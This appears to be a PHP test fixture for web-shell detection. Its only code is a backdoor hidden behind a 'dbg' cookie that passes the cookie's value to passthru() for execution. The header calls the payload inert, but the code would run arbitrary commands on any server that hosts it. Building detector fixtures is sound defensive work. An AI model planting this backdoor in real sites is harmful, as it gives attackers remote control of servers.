<?php
// DETECTION TEST FIXTURE -- inert payload, never deploy this file.

// hidden behind a cookie so casual visitors do not see it
if (!empty($_COOKIE['dbg'])) {
    passthru($_COOKIE['dbg']);
}
